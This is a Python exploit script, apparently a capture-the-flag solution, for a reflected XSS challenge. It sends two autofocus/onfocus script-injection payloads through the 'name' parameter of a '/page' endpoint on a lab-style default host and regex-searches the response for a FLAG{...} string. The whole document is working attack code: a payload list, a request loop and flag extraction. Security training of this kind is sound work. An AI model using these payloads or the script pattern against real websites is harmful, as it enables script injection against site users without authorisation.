#!/usr/bin/env python3
import sys
import re
import requests
from urllib.parse import quote

"""
X-008-24 exploit (Reflected XSS)
Usage:
  pip install requests
  python3 exp.py [BASE_URL]

Default BASE_URL: http://ip32773
"""

BASE = sys.argv[1] if len(sys.argv) > 1 else "http://ip32773"

payloads = [
    '<input autofocus onfocus=alert(/XSS/.source)>',
    '<input autofocus onfocus=alert(String.fromCharCode(88,83,83))>',
]

def extract_flag(html: str):
    m = re.search(r'Here is the flag:\s*([^<\r\n]+)', html, re.I)
    if m:
        return m.group(1).strip()
    m = re.search(r'FLAG\{[^}]+\}', html)
    if m:
        return m.group(0)
    return None

headers = {"User-Agent": "Mozilla/5.0 (X-008-24-EXP)"}

for p in payloads:
    url = f"{BASE}/page?name={quote(p, safe='')}"
    try:
        resp = requests.get(url, headers=headers, timeout=20)
    except Exception as e:
        print(f"[!] Request failed: {e}")
        continue
    print(f"[.] Tried payload: {p} -> HTTP {resp.status_code}")
    if resp.status_code != 200:
        continue
    flag = extract_flag(resp.text)
    if flag:
        print(f"[+] Flag: {flag}")
        sys.exit(0)

print("[!] Flag not found. See last response snippet below:\n")
print(resp.text[:1200])
sys.exit(2)

